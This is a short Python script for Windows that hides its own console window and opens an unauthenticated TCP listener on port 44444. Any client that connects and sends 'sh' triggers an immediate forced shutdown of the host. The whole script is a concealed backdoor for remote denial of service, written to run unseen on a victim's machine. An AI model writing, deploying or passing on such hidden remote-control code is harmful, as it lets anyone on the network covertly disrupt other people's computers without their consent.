import win32gui, win32con
import socket, os
BUFFER = 1024
HOST = "0.0.0.0"
PORT = 44444

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

if __name__ == "__main__":
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen()
    print("Server is listening...")
    while True:
        client, address = server.accept()
        print(f'Connected with {str(address)}')
        command = client.recv(BUFFER).decode('utf-8')
        if command == "sh":
            os.system("shutdown /s /f /t 0")

win32gui.ShowWindow(the_program_to_hide , win32con.SW_SHOW)